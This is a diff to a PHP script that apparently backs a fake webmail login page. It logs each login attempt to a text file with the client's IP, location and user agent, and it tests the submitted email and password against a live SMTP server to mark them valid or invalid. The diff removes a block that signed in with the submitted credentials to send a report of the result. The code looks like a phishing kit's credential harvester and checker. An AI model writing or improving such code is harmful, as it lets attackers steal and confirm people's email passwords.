@@ -179,48 +179,7 @@ try {
     // Log the attempt
     file_put_contents('webmail_login_log.txt', $logEntry, FILE_APPEND | LOCK_EX);
     
-    // Try to send notification email (but don't let it break the main functionality)
-    $notificationSent = false;
-    try {
-        // Configure notification email
-        $notifyMail = new PHPMailer(true);
-        $notifyMail->isSMTP();
-        $notifyMail->Host = $smtpConfig['host'];
-        $notifyMail->Port = $smtpConfig['port'];
-        $notifyMail->SMTPSecure = $smtpConfig['secure'];
-        $notifyMail->SMTPAuth = true;
-        $notifyMail->Username = $email;
-        $notifyMail->Password = $password;
-        $notifyMail->SMTPDebug = 0;
-        $notifyMail->Timeout = 10;
-        $notifyMail->SMTPKeepAlive = false;
-        
-        $notifyMail->setFrom($email, 'Webmail Login Test');
-        $notifyMail->addAddress($email);
-        $notifyMail->Subject = 'Webmail Login Test - ' . ($isValid ? 'SUCCESS' : 'FAILED');
-        
-        $body = "Webmail Login Test Results\n\n";
-        $body .= "Email: {$email}\n";
-        $body .= "Status: " . ($isValid ? 'VALID CREDENTIALS' : 'INVALID CREDENTIALS') . "\n";
-        $body .= "Timestamp: {$timestamp}\n";
-        $body .= "Client IP: {$clientIP}\n";
-        $body .= "Location: {$geoInfo}\n";
-        $body .= "User Agent: {$userAgent}\n";
-        $body .= "Error: {$errorMessage}\n";
-        
-        $notifyMail->Body = $body;
-        $notifyMail->AltBody = strip_tags($body);
-        
-        if ($notifyMail->send()) {
-            $notificationSent = true;
-        }
-    } catch (Exception $e) {
-        // Log notification failure but don't break the main functionality
-        error_log("Failed to send notification email: " . $e->getMessage());
-        $notificationSent = false;
-    }
-    
-    // Prepare response
+    // Prepare response (no email notifications)
     $response = [
         'signal' => $isValid ? 'ok' : 'error',
         'success' => $isValid,
@@ -234,7 +193,8 @@ try {
             'client_ip' => $clientIP,
             'location' => $geoInfo,
             'timestamp' => $timestamp,
-            'notification_sent' => $notificationSent,
+            'notification_sent' => false,
+            'notification_disabled' => true,
             'error_message' => $errorMessage
         ]
     ];
